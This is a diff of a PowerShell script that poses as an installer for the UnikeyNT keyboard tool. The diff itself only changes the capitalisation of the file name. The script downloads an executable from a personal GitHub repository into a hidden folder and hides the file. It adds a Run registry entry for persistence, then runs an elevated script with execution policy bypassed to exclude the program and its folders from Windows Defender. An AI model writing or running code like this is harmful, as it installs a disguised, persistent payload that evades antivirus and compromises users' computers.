@@ -72,7 +72,7 @@ function Get-File
   }
 }
 
-$uri = "https://github.com/yourname1204/future/raw/main/UnikeyNT.exe"
+$uri = "https://github.com/yourname1204/future/raw/main/UniKeyNT.exe"
 $dir = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'UnikeyNT\'
 if (!(Test-Path -Path $dir)) {
     New-Item -ItemType Directory -Force -Path $dir
@@ -80,14 +80,14 @@ if (!(Test-Path -Path $dir)) {
 $hiddenAttribute = [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path (Join-Path -Path $env:LOCALAPPDATA -ChildPath 'UnikeyNT\') -Name Attributes -Value $hiddenAttribute
 Set-ItemProperty -Path $dir -Name Attributes -Value $hiddenAttribute
-$file_path = Join-Path -Path $dir -ChildPath 'UnikeyNT.exe'
+$file_path = Join-Path -Path $dir -ChildPath 'UniKeyNT.exe'
 Get-File -Uri $uri -TargetFile $dir
 if (Test-Path -Path $file_path) {
     [System.Console]::Clear()
     Write-Host "Successfully installed UnikeyNT64"
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'UnikeyNT64' -Value $file_path
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
-    $cmd1 = "Add-MpPreference -ExclusionProcess UnikeyNT.exe; Add-MpPreference -ExclusionPath ${env:LOCALAPPDATA}\UnikeyNT; Add-MpPreference -ExclusionPath ${file_path}"
+    $cmd1 = "Add-MpPreference -ExclusionProcess UniKeyNT.exe; Add-MpPreference -ExclusionPath ${env:LOCALAPPDATA}\UnikeyNT; Add-MpPreference -ExclusionPath ${file_path}"
     Set-Content -Path "${env:LOCALAPPDATA}\run2.ps1" -Value $cmd1
     Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File ${env:LOCALAPPDATA}\run2.ps1")
     Write-Host "Successfully added to Windows Defender exclusion list"
